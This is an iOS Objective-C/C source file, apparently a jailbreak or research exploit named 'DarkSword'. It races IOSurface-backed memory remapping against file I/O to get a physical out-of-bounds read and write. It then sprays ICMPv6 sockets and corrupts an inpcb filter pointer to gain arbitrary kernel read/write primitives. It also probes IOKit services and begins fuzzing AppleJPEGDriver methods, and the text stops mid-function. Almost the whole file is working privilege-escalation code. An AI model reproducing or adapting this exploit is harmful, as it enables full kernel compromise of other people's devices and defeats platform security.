#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <mach-o/dyld.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/fileport.h>
#include <pthread.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <spawn.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <aio.h>
#include <glob.h>
#include <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <ImageIO/ImageIO.h>
#import <CoreGraphics/CoreGraphics.h>
// Minimal valid JPEG (1x1 pixel, baseline, YCbCr)
static const uint8_t kTinyJPEG[] = {
    0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x00,0x00,0x01,
    0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,0x00,0x08,0x06,0x06,0x07,0x06,0x05,0x08,
    0x07,0x07,0x07,0x09,0x09,0x08,0x0A,0x0C,0x14,0x0D,0x0C,0x0B,0x0B,0x0C,0x19,0x12,
    0x13,0x0F,0x14,0x1D,0x1A,0x1F,0x1E,0x1D,0x1A,0x1C,0x1C,0x20,0x24,0x2E,0x27,0x20,
    0x22,0x2C,0x23,0x1C,0x1C,0x28,0x37,0x29,0x2C,0x30,0x31,0x34,0x34,0x34,0x1F,0x27,
    0x39,0x3D,0x38,0x32,0x3C,0x2E,0x33,0x34,0x32,0xFF,0xC0,0x00,0x0B,0x08,0x00,0x01,
    0x00,0x01,0x01,0x01,0x11,0x00,0xFF,0xC4,0x00,0x1F,0x00,0x00,0x01,0x05,0x01,0x01,
    0x01,0x01,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x03,0x04,0x05,
    0x06,0x07,0x08,0x09,0x0A,0x0B,0xFF,0xC4,0x00,0xB5,0x10,0x00,0x02,0x01,0x03,0x03,
    0x02,0x04,0x03,0x05,0x05,0x04,0x04,0x00,0x00,0x01,0x7D,0x01,0x02,0x03,0x00,0x04,
    0x11,0x05,0x12,0x21,0x31,0x41,0x06,0x13,0x51,0x61,0x07,0x22,0x71,0x14,0x32,0x81,
    0x91,0xA1,0x08,0x23,0x42,0xB1,0xC1,0x15,0x52,0xD1,0xF0,0x24,0x33,0x62,0x72,0x82,
    0x09,0x0A,0x16,0x17,0x18,0x19,0x1A,0x25,0x26,0x27,0x28,0x29,0x2A,0x34,0x35,0x36,
    0x37,0x38,0x39,0x3A,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x53,0x54,0x55,0x56,
    0x57,0x58,0x59,0x5A,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6A,0x73,0x74,0x75,0x76,
    0x77,0x78,0x79,0x7A,0x83,0x84,0x85,0x86,0x87,0x88,0x89,0x8A,0x92,0x93,0x94,0x95,
    0x96,0x97,0x98,0x99,0x9A,0xA2,0xA3,0xA4,0xA5,0xA6,0xA7,0xA8,0xA9,0xAA,0xB2,0xB3,
    0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,0xBA,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,0xC8,0xC9,0xCA,
    0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,0xDA,0xE1,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,
    0xE8,0xE9,0xEA,0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,0xFA,0xFF,0xC4,0x00,
    0x1F,0x01,0x00,0x03,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x00,0x00,0x00,
    0x00,0x00,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0xFF,0xC4,
    0x00,0xB5,0x11,0x00,0x02,0x01,0x02,0x04,0x04,0x03,0x04,0x07,0x05,0x04,0x04,0x00,
    0x01,0x02,0x77,0x00,0x01,0x02,0x03,0x11,0x04,0x05,0x21,0x31,0x06,0x12,0x41,0x51,
    0x07,0x61,0x71,0x13,0x22,0x32,0x81,0x08,0x14,0x42,0x91,0xA1,0xB1,0xC1,0x09,0x23,
    0x33,0x52,0xF0,0x15,0x62,0x72,0xD1,0x0A,0x16,0x24,0x34,0xE1,0x25,0xF1,0x17,0x18,
    0x19,0x1A,0x26,0x27,0x28,0x29,0x2A,0x35,0x36,0x37,0x38,0x39,0x3A,0x43,0x44,0x45,
    0x46,0x47,0x48,0x49,0x4A,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A,0x63,0x64,0x65,
    0x66,0x67,0x68,0x69,0x6A,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7A,0x82,0x83,0x84,
    0x85,0x86,0x87,0x88,0x89,0x8A,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9A,0xA2,
    0xA3,0xA4,0xA5,0xA6,0xA7,0xA8,0xA9,0xAA,0xB2,0xB3,0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,
    0xBA,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,0xC8,0xC9,0xCA,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,
    0xD8,0xD9,0xDA,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,0xEA,0xF2,0xF3,0xF4,0xF5,
    0xF6,0xF7,0xF8,0xF9,0xFA,0xFF,0xDA,0x00,0x08,0x01,0x01,0x00,0x00,0x3F,0x00,0x77,
    0x3F,0xC0,0x7F,0xFF,0xD9
};

void IOSurfacePrefetchPages(IOSurfaceRef surface);

extern kern_return_t mach_vm_allocate(task_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(task_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(task_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci(uint64_t a)
{
    asm(".long        0xDAC143E0"); // XPACI X0
    asm("ret");
}
static uint64_t xpaci(uint64_t a)
{
    // If it already looks like a plain kernel pointer, leave it alone
    if ((a & 0xFFFFFF0000000000) == 0xFFFFFF0000000000) return a;
    return __xpaci(a);
}
#else
#define __xpaci(x) x
#define xpaci(x) x
#endif

#include "offsets.h"
#include "AppDelegate.h"

// ===== Global state =====
static uint64_t randomMarker;
static uint64_t wiredPageMarker;
static mach_port_t pcObject = MACH_PORT_NULL;
static mach_vm_address_t pcAddress = 0;
static mach_vm_size_t pcSize;
static int readFd, writeFd;
static NSMutableArray *socketPorts;
static NSMutableArray *socketPcbIds;
static int controlSocket = 0, rwSocket = 0;
static uint64_t controlSocketPcb = 0, rwSocketPcb = 0;
static uint8_t controlData[0x20];
static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
static volatile uint8_t writeRequested = 0, writeDone = 0;
static volatile mach_vm_address_t freeTarget = 0;
static volatile mach_vm_size_t freeTargetSize = 0;
static volatile mem_entry_name_port_t targetObject = 0;
static volatile memory_object_offset_t targetObjectOffset = 0;
static pthread_t freeThread;
static pthread_t writeThread;
static int highestSuccessIdx = 0;
static int successReadCount = 0;
static struct iovec iov;
static char executablePath[PATH_MAX];
static const char *executableName;
static NSMutableDictionary *gMlockDict;

// Kernel state globals (used by all phases)
uint64_t gOurProc, gKernelProc, gOurTask, gKernelTask, gIS_TABLE;
uint64_t gOurPmap, gKernelPmap, gKernelBase, gKernelSlide;

// ===== Helpers =====
#define FAILURE(c) do { log_printf(@"[-] FAILURE at %s:%d\n", __FILE__, __LINE__); return; } while(0)

void c_log(const char *fmt, ...) {
    char buf[4096];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    log_printf(@"%s", buf);
}
#define printf(...) c_log(__VA_ARGS__)

void memset64(void *ptr, uint64_t val, size_t sz) {
    for (size_t i = 0; i < sz; i += 8)
        *(uint64_t*)((uint8_t*)ptr + i) = val;
}

// ===== DarkSword ICMP6 Socket Exploit =====

IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAddress": @(address),
        @"IOSurfaceAllocSize": @(size)
    });
    IOSurfacePrefetchPages(surface);
    return surface;
}

void surface_mlock(uint64_t address, uint64_t size) {
    gMlockDict[@(address)] = (__bridge id)create_surface_with_address(address, size);
}

void surface_munlock(uint64_t address, uint64_t size) {
    IOSurfaceRef ref = (__bridge IOSurfaceRef)gMlockDict[@(address)];
    if (ref) {
        CFRelease(ref);
        [gMlockDict removeObjectForKey:@(address)];
    }
}

static void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size) {
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(size),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };

    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);

    if (!surface) {
        printf("[-] IOSurfaceCreate failed — falling back to pure Mach VM\n");
        kern_return_t kr = mach_vm_allocate(mach_task_self(), address, size,
            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
            printf("[-] mach_vm_allocate: %s\n", mach_error_string(kr));
            return;
        }
        memset64((void*)*address, randomMarker, size);
        kr = mach_make_memory_entry_64(mach_task_self(), &size, *address,
            VM_PROT_DEFAULT, port, 0);
        if (kr != KERN_SUCCESS) {
            printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
            mach_vm_deallocate(mach_task_self(), *address, size);
            return;
        }
        printf("[+] fallback bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
        return;
    }

    void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
    printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);

    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size,
        (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, port, 0);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
        CFRelease(surface);
        return;
    }

    kr = mach_vm_map(mach_task_self(), address, size, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, *port, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_map: %s\n", mach_error_string(kr));
        mach_port_deallocate(mach_task_self(), *port);
        CFRelease(surface);
        return;
    }

    CFRelease(surface);
    printf("[+] IOSurface bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
}

static bool initialize_bounce_buffer(uint64_t size) {
    pcSize = size;
    create_physically_contiguous_mapping(&pcObject, &pcAddress, pcSize);
    if (!pcObject || !pcAddress) {
        printf("[-] create_physically_contiguous_mapping failed\n");
        return false;
    }
    memset64((void *)pcAddress, randomMarker, pcSize);
    freeTarget = pcAddress;
    freeTargetSize = pcSize;
    freeThreadStart = 1;
    goSync = 1;
    return true;
}

void init_target_file(void) {
    char rp[1024] = {}, wp[1024] = {};
    confstr(_CS_DARWIN_USER_TEMP_DIR, rp, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, wp, 1024);
    char rn[64], wn[64];
    snprintf(rn, sizeof(rn), "/%u", arc4random());
    snprintf(wn, sizeof(wn), "/%u", arc4random());
    strlcat(rp, rn, sizeof(rp));
    strlcat(wp, wn, sizeof(wp));
    void *c = calloc(1, 2 * PAGE_SIZE);
    FILE *f = fopen(rp, "w"); fwrite(c, 1, 2 * PAGE_SIZE, f); fclose(f);
    f = fopen(wp, "w"); fwrite(c, 1, 2 * PAGE_SIZE, f); fclose(f);
    free(c);
    readFd = open(rp, O_RDWR);
    writeFd = open(wp, O_RDWR);
    remove(rp); remove(wp);
    fcntl(readFd, F_NOCACHE, 1);
    fcntl(writeFd, F_NOCACHE, 1);
}

void *free_thread(void *arg) {
    (void)arg;
    while (freeThreadStart == 0) {}
    while (goSync == 0) {}
    while (goSync != 0) {
        while (raceSync == 0) {}
        mach_vm_map(mach_task_self(), (mach_vm_address_t*)&freeTarget, freeTargetSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, targetObject, targetObjectOffset, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        raceSync = 0;
    }
    return NULL;
}

// Simple direct check: scan freed pages for non-randomMarker data
// indicating the kernel reused them (e.g., for inpcb structures)
bool scan_freed_pages(void *buf, mach_vm_size_t size) {
    uint64_t *words = (uint64_t *)buf;
    uint64_t n = size / sizeof(uint64_t);
    for (uint64_t i = 0; i < n; i++) {
        if (words[i] != randomMarker) return true;
    }
    return false;
}

fileport_t spray_socket(void) {
    pthread_set_qos_class_self_np(QOS_CLASS_BACKGROUND, 0);
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) { pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0); return -1; }
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
    fileport_t port = 0;
    fileport_makeport(fd, &port);
    close(fd);
    void *info = calloc(1, 0x400);
    syscall(336, 6, getpid(), 3, port, info, 0x400);
    uint64_t gencnt = *(uint64_t*)((uintptr_t)info + 0x110);
    [(NSMutableArray*)socketPorts addObject:@(port)];
    [(NSMutableArray*)socketPcbIds addObject:@(gencnt)];
    free(info);
    return port;
}

void sockets_release(void) {
    while ([(NSMutableArray*)socketPorts lastObject]) {
        mach_port_deallocate(mach_task_self(),
            ((NSNumber*)[(NSMutableArray*)socketPorts lastObject]).unsignedIntValue);
        [(NSMutableArray*)socketPorts removeLastObject];
        [(NSMutableArray*)socketPcbIds removeLastObject];
    }
}

kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
                             mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    targetObject = memObj;
    targetObjectOffset = memOff;
    iov.iov_base = (void*)(pcAddress + 0x3f00);
    iov.iov_len = off + size;
    *(uint64_t*)buf = randomMarker;
    *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;

    bool readRaceSucceeded = false;
    for (int t = 0; t < highestSuccessIdx + 100; t++) {
        raceSync = 1;
        int w = pwritev(readFd, &iov, 1, 0x3f00);
        while (raceSync == 1) {}
        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (w == -1) {
            pread(readFd, buf, size, 0x3f00 + off);
            uint64_t marker = *(uint64_t*)buf;
            if (marker != randomMarker) {
                readRaceSucceeded = true;
                successReadCount++;
                if (t > highestSuccessIdx) highestSuccessIdx = t;
                break;
            } else {
                usleep(1);
            }
        }
        if (t == 500) break;
    }
    targetObject = 0;
    if (!readRaceSucceeded) return 1;
    return KERN_SUCCESS;
}

kern_return_t phys_oob_read_retry(mach_port_t memObj, mach_vm_offset_t memOff,
                                    mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    kern_return_t kr;
    do { kr = phys_oob_read(memObj, memOff, size, off, buf); } while (kr != KERN_SUCCESS);
    return kr;
}

void phys_oob_write(mach_port_t memObj, mach_vm_offset_t memOff,
                     mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    targetObject = memObj;
    targetObjectOffset = memOff;
    iov.iov_base = (void*)(pcAddress + 0x3f00);
    iov.iov_len = off + size;
    pwrite(writeFd, buf, size, 0x3f00 + off);
    for (int t = 0; t < 20; t++) {
        raceSync = 1;
        preadv(writeFd, &iov, 1, 0x3f00);
        while (raceSync == 1) {}
        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    }
    targetObject = 0;
}

void set_kaddr(uint64_t where) {
    memset(controlData, 0, 0x20);
    *(uint64_t*)controlData = where;
    setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, 0x20);
}

void early_kread(uint64_t where, void *buf, size_t size) {
    set_kaddr(where);
    socklen_t len = (socklen_t)size;
    getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, &len);
}

uint64_t kread64(uint64_t where) {
    uint64_t v = 0; early_kread(where, &v, 8); return v;
}

uint32_t kread32(uint64_t where) {
    uint32_t v = 0; early_kread(where, &v, 4); return v;
}

uint16_t kread16(uint64_t where) {
    uint16_t v = 0; early_kread(where, &v, 2); return v;
}

uint8_t kread8(uint64_t where) {
    uint8_t v = 0; early_kread(where, &v, 1); return v;
}

uint64_t kread_ptr(uint64_t where) { return xpaci(kread64(where)); }

void kread_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) {
        *(uint64_t*)b = kread64(where);
        where += 8; b += 8; size -= 8;
    }
    if (size) early_kread(where, b, size);
}

void kwrite64(uint64_t where, uint64_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint64_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite32(uint64_t where, uint32_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint32_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite16(uint64_t where, uint16_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint16_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite8(uint64_t where, uint8_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint8_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) {
        kwrite64(where, *(uint64_t*)b);
        where += 8; b += 8; size -= 8;
    }
    if (size) {
        uint8_t tmp[0x20];
        early_kread(where, tmp, 0x20);
        memcpy(tmp, b, size);
        set_kaddr(where);
        setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmp, 0x20);
    }
}

// reverse memmem: search needle backward from the END of haystack window [0, haystack_len)
static void *reverse_memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len) {
    if (needle_len == 0) return (void *)haystack;
    if (haystack_len < needle_len) return NULL;
    const unsigned char *h = (const unsigned char *)haystack;
    for (size_t i = haystack_len - needle_len + 1; i-- > 0;) {
        if (memcmp(h + i, needle, needle_len) == 0) return (void *)(h + i);
    }
    return NULL;
}

int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
                             void *rBuf, void *wBuf, NSMutableArray *usedGc, bool doRead) {
    if (doRead) phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
    // ClearSword matching: the default icmp6_filter is NOT all-ones on iOS 18;
    // inpcb + icmp6filt + 8 holds 0x0000ffffffffffff (filter low bits + inp6_cksum/hops).
    // Locate it BEFORE the executableName oracle, derive the exact inpcb base.
    uint64_t corruptedFilterMarker = 0x0000ffffffffffff;
    int si = 0; bool found = false; uint64_t pso = 0;
    void *hit;
    do {
        hit = memmem(rBuf + si, OOB_SIZE - si, executableName, strlen(executableName));
        if (hit) {
            uint64_t foundOff = (uint64_t)hit - (uint64_t)rBuf;
            void *filterHit = reverse_memmem(rBuf, foundOff, &corruptedFilterMarker, sizeof(corruptedFilterMarker));
            if (filterHit) {
                uint64_t filterOff = (uint64_t)filterHit - (uint64_t)rBuf;
                if (filterOff >= OFFSET_ICMP6FILT + 8) {
                    pso = filterOff - (OFFSET_ICMP6FILT + 8);
                    found = true;
                    break;
                }
            }
        }
        si += 0x400;
    } while (hit && si < OOB_SIZE);
    if (!found) return -1;

    uint64_t tg = *(uint64_t*)((uintptr_t)rBuf + pso + 0x78);
    if (tg == ((NSNumber*)[(NSMutableArray*)socketPcbIds lastObject]).unsignedLongLongValue)
        return -1;

    int csi = -1;
    for (int i = 0; i < [socketPorts count]; i++) {
        if ([(NSNumber*)socketPcbIds[i] unsignedLongLongValue] == tg) {
            csi = i; break;
        }
    }
    if (csi < 0 || [(NSMutableArray*)usedGc containsObject:@(tg)]) return -1;
    [usedGc addObject:@(tg)];

    uint64_t inpListNext = *(uint64_t*)((uintptr_t)rBuf + pso + 0x28);
    uint64_t inpNext = inpListNext - 0x20;

    // PANIC MITIGATION: PCB B ("rwSocketPcb") must be a live inpcb, NOT freed
    // memory that could have been recycled as a 32-byte MAC label. If the
    // inpcb was freed, the first 0x20-byte KRW write through set_kaddr()
    // corrupts the MAC label zone -> ZBC panic (observed on-device).
    // We cannot read PCB B's gencnt here (KRW not established yet), so we
    // enforce a strict shape check (page-aligned kernel heap) and keep the
    // socket that backs it alive for the whole process lifetime.
    if ((inpNext & 0xfff) != 0 || (inpNext >> 40) != 0xFFFFFF) {
        printf("[-] PCB B rejected: not kernel heap/aligned 0x%llx\n", inpNext);
        return -1;
    }
    if (csi + 1 >= [socketPorts count]) {
        printf("[-] PCB B rejected: no rwSocket candidate at csi+1\n");
        return -1;
    }

    rwSocketPcb = inpNext;
    memcpy(wBuf, rBuf, OOB_SIZE);
    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT) = inpNext + OFFSET_ICMP6FILT;
    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT + 8) = 0;

    while (1) {
        phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
        phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
        if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT) == inpNext + OFFSET_ICMP6FILT)
            break;
    }

    int sock = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi] unsignedLongLongValue]);
    uint8_t gd[0x20]; socklen_t sl = 0x20;
    getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, gd, &sl);
    if (*(uint64_t*)gd != (uint64_t)-1) {
        controlSocket = sock;
        rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi+1] unsignedLongLongValue]);
        return 0;
    }
    return -1;
}

// ===== IOKit Diagnostic =====

struct iokit_test {
    const char *name;
    const char *service;
    uint32_t type;
};

static bool test_iokit_service(const char *name, const char *path, uint32_t type) {
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching(path));
    if (!svc) {
        svc = IORegistryEntryFromPath(MACH_PORT_NULL, path);
    }
    if (!svc) {
        printf("[IOKit] %s: service not found\n", name);
        return false;
    }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, type, &conn);
    if (kr != KERN_SUCCESS) {
        printf("[IOKit] %s @ %s: IOServiceOpen failed (%#x)\n", name, path, kr);
        IOObjectRelease(svc);
        return false;
    }
    printf("[IOKit] %s @ %s: OPENED (conn=%#x)\n", name, path, conn);
    IOServiceClose(conn);
    IOObjectRelease(svc);
    return true;
}

static void try_open_service(const char *name, uint32_t type, bool multiType) {
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching(name));
    if (!svc) {
        if (!multiType) printf("[IOKit] %s: not found\n", name);
        return;
    }
    if (multiType) {
        for (uint32_t t = 0; t <= 3; t++) {
            io_connect_t conn = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self_, t, &conn);
            printf("[IOKit] %s type=%u: %s (conn=%#x, kr=%#x)\n",
                   name, t, kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
            if (conn) IOServiceClose(conn);
        }
    } else {
        io_connect_t conn = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self_, type, &conn);
        printf("[IOKit] %s: %s (conn=%#x, kr=%#x)\n",
               name, kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
        if (conn) IOServiceClose(conn);
    }
    IOObjectRelease(svc);
}

static void diagnostic_iokit(void) {
    printf("\n=== IOKit Diagnostic ===\n");
    const char *svcNames[] = {
        "IOSurfaceRoot", "AppleJPEGDriver", "AGXDevice", "AGX14Device",
        "AGX13Device", "H11ANEIn", "H11ANE", "AppleANE",
        "IOAudioEngine", "IOHDACodecDriver", "AppleT8112Device",
        "IOPlatformExpertDevice", "AppleEmbeddedSPI",
        "AppleCL2", "AppleDCP", "AppleAVE2Driver", "AppleH11CameraInterface",
        "AppleSPUDevice", "AppleDCPExtension", "AppleCSIReceiver",
        "AppleSmartIO2", "AppleT8112DART", "IOGPU",
    };
    for (int i = 0; i < sizeof(svcNames)/sizeof(svcNames[0]); i++) {
        if (strcmp(svcNames[i], "H11ANE") == 0)
            try_open_service(svcNames[i], 0, true);
        else if (strcmp(svcNames[i], "AppleJPEGDriver") == 0) {
            // Try types 0-3 for JPEG too
            io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
                IOServiceNameMatching("AppleJPEGDriver"));
            if (svc) {
                for (uint32_t t = 0; t <= 3; t++) {
                    io_connect_t conn = 0;
                    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, t, &conn);
                    printf("[IOKit] AppleJPEGDriver type=%u: %s (conn=%#x, kr=%#x)\n",
                           t, kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
                    if (conn) IOServiceClose(conn);
                }
                IOObjectRelease(svc);
            } else {
                printf("[IOKit] AppleJPEGDriver: not found\n");
            }
        } else
            try_open_service(svcNames[i], 0, false);
    }
    printf("=== IOKit Diagnostic Complete ===\n\n");
}

// ===== AppleJPEGDriver Struct + Type Fuzzer =====
// Tries all 4 user-client types with struct inputs of varying sizes



static void method_jpeg_size_scan(void) {
    printf("\n[Method: JPEG_size] Exhaustive struct size scan for AppleJPEGDriver...\n");
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching("AppleJPEGDriver"));
    if (!svc) { printf("[JPEG_size] service not found\n"); return; }

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { printf("[JPEG_size] IOServiceOpen failed: %#x\n", kr); return; }
    printf("[JPEG_size] connection=%d\n", conn);

    // Create IOSurfaces for JPEG decode
    int imgW = 64, imgH = 64;
    IOSurfaceRef inputSurf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge id)kIOSurfaceAllocSize : @(imgW * imgH * 4),
        (__bridge id)kIOSurfaceWidth : @(imgW),
        (__bridge id)kIOSurfaceHeight : @(imgH),
        (__bridge id)kIOSurfaceBytesPerRow : @(imgW * 4),
        (__bridge id)kIOSurfacePixelFormat : @(0x34323066),
        (__bridge id)kIOSurfaceBytesPerElement : @(4),
    });
    IOSurfaceRef outputSurf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge id)kIOSurfaceAllocSize : @(imgW * imgH * 4),
        (__bridge id)kIOSurfaceWidth : @(imgW),
        (__bridge id)kIOSurfaceHeight : @(imgH),
        (__bridge id)kIOSurfaceBytesPerRow : @(imgW * 4),
        (__bridge id)kIOSurfacePixelFormat : @(0x42475241),
        (__bridge id)kIOSurfaceBytesPerElement : @(4),
    });
    if (!inputSurf || !outputSurf) {
        printf("[JPEG_size] IOSurfaceCreate failed\n");
        if (inputSurf) CFRelease(inputSurf);
        if (outputSurf) CFRelease(outputSurf);
        IOServiceClose(conn);
        return;
    }
    uint32_t srcID = IOSurfaceGetID(inputSurf);
    uint32_t dstID = IOSurfaceGetID(outputSurf);

    // Copy JPEG data to input surface
    IOSurfaceLock(inputSurf, 0, NULL);
    size_t jpegBytes = sizeof(kTinyJPEG) < (size_t)(imgW * imgH * 4) ? sizeof(kTinyJPEG) : (imgW * imgH * 4);
    memcpy(IOSurfaceGetBaseAddress(inputSurf), kTinyJPEG, jpegBytes);
    IOSurfaceUnlock(inputSurf, 0, NULL);

    // Test 1: methods 0 and 2 with scalar 0/0
    printf("\n[JPEG_size] --- Scalar 0/0 test ---\n");
    uint32_t scalarOut[4] = {};
    uint32_t scalarCnt = 4;
    for (uint32_t m = 0; m < 16; m++) {
        kr = IOConnectCallMethod(conn, m, NULL, 0, NULL, 0,
            scalarOut, &scalarCnt, NULL, NULL);
        printf("[JPEG_size] method=%d scalar(0,0): kr=%#x outCnt=%u\n", m, kr, scalarCnt);
    }

    // Test 2: exhaustive struct size scan for methods 0-7
    printf("\n[JPEG_size] --- Exhaustive struct size scan (0-256, step 4) ---\n");
    uint8_t buf[512];
    size_t outSize = sizeof(buf);

    for (uint32_t m = 0; m < 8; m++) {
        int hits = 0;
        for (size_t sz = 0; sz <= 256; sz += 4) {
            memset(buf, 0, sizeof(buf));
            // Fill struct with likely field values
            if (sz >= 4) {
                // Try IOSurfaceID at offset 0 (Alyssa layout)
